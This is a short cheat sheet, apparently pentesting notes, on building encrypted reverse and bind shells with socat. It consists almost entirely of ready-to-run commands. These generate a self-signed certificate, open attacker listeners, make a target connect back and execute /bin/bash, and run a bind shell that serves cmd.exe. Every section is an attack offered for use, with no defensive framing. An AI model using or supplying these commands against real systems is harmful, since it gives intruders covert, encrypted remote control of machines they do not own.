<h4>socat encrypted shells</jh4>

**GENERATE CERT**

**create cert: (attacker)**

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

**merge 2 certs: (attacker)**

```
cat shell.key shell.crt > shell.pem
```

**setup listener(attacker)**

```
socat OPENSSL-LISTEN:<lport>,cert=shell.pem,verify=0 -
```
OR
```
socat OPENSSL-LISTEN:<lport>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

<h4>CONNECT (reverse)</h4>

**connect back: (target)**

```
socat OPENSSL:<lhost:lport>,verify=0 EXEC:/bin/bash
```
OR

target to linux:

```
socat OPENSSL:<lhost:lport>,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane
```

**CONNECT** (bind)

target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

attacker:

```
 socat OPENSSL:<rhost:rport>,verify=0 -
```